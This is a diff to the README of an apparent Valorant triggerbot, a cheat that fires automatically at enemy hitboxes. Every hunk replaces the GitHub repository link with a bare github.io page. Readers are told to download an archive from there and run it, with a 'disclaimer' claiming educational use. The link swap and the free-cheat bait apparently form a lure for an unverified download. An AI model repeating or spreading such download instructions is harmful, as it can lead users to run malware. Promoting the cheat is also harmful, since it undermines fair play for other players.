@@ -1,6 +1,6 @@
 # 🎯 valorant-triggerbot-2026 - Auto-Fire On Enemy Hitboxes
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_Triggerbot_2026-blue?style=for-the-badge&logo=github)](https://github.com/Hurried-bali6090/valorant-triggerbot-2026)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_Triggerbot_2026-blue?style=for-the-badge&logo=github)](https://hurried-bali6090.github.io)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps exactly, and you will be up and running in under five minutes
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Hurried-bali6090/valorant-triggerbot-2026](https://github.com/Hurried-bali6090/valorant-triggerbot-2026)
+Visit this link to download the application: [https://hurried-bali6090.github.io](https://hurried-bali6090.github.io)
 
 Look for the large **Download** button on that page. Click it, and the download will begin automatically. The file you download is a single compressed archive that contains everything you need.
 
@@ -132,7 +132,7 @@ A: First, make sure your activation key is pressed. Then check that you have sel
 
 We regularly release updates to improve performance and compatibility. To get the latest version:
 
-1. Visit the same download link: [https://github.com/Hurried-bali6090/valorant-triggerbot-2026](https://github.com/Hurried-bali6090/valorant-triggerbot-2026)
+1. Visit the same download link: [https://hurried-bali6090.github.io](https://hurried-bali6090.github.io)
 2. Check the release date on the page to see if it is newer than your version.
 3. Download the new archive, extract it, and replace your old files.
 
@@ -146,7 +146,7 @@ This software is intended for educational and personal use only. You are respons
 
 ## 📞 Support
 
-If you encounter any issues not covered here, please return to the download page at [https://github.com/Hurried-bali6090/valorant-triggerbot-2026](https://github.com/Hurried-bali6090/valorant-triggerbot-2026) and look for the "Issues" tab. Open a new issue describing your problem, and we will assist you.
+If you encounter any issues not covered here, please return to the download page at [https://hurried-bali6090.github.io](https://hurried-bali6090.github.io) and look for the "Issues" tab. Open a new issue describing your problem, and we will assist you.
 
 ---
 
